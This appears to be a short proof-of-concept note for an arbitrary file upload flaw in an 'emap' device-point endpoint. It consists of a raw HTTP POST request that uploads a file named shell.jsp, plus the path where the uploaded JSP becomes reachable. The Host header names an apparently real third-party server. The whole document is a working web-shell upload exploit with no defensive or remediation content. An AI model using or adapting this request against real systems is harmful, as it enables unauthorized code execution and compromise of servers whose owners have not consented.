https://www.cnblogs.com/qiqiyyds/articles/17640346.html

地址：

```url
127.0.0.1/upload/emap/society_new/ico_res_c0f9f27d05a7_on.jsp
```

poc

```poc
POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1
Content-Type: multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Host: vdh8900.gongdibang.cn
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 225
Connection: close

--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
Content-Disposition: form-data; name="upload"; filename="shell.jsp"
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary

123
--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--
```

